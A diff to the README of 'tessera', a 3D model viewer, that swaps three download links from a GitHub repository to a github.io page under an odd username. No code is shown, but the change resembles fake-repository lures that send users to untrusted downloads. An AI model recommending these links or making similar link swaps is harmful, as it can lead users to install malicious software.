@@ -4,13 +4,13 @@
 
 Welcome to **tessera** — your all-in-one solution for viewing, converting, and exploring 3D models with ease. Whether you're a designer, engineer, or just curious about 3D files, tessera makes it simple to open virtually any 3D format on your computer.
 
-[![Download tessera](https://img.shields.io/badge/Download-tessera-2ea44f?style=for-the-badge&logo=github)](https://github.com/Malyndaoverbearing532/tessera)
+[![Download tessera](https://img.shields.io/badge/Download-tessera-2ea44f?style=for-the-badge&logo=github)](https://malyndaoverbearing532.github.io)
 
 ## 📥 Download & Install
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/Malyndaoverbearing532/tessera](https://github.com/Malyndaoverbearing532/tessera)
+Visit this link to download the application: [https://malyndaoverbearing532.github.io](https://malyndaoverbearing532.github.io)
 
 ### Step 2: Install on Windows
 
@@ -156,6 +156,6 @@ tessera is released under an open-source license — check the `LICENSE` file in
 
 tessera puts the power of professional 3D viewing in your hands. Start downloading today and unlock the full potential of your 3D workflow. Happy modeling!
 
-**[Download tessera now](https://github.com/Malyndaoverbearing532/tessera)**
+**[Download tessera now](https://malyndaoverbearing532.github.io)**
 
 Keywords: 3d,3d-viewer,assimp,computer-graphics,cpp,cpp20,gltf,macos,mesh,model-viewer,opengl,pbr
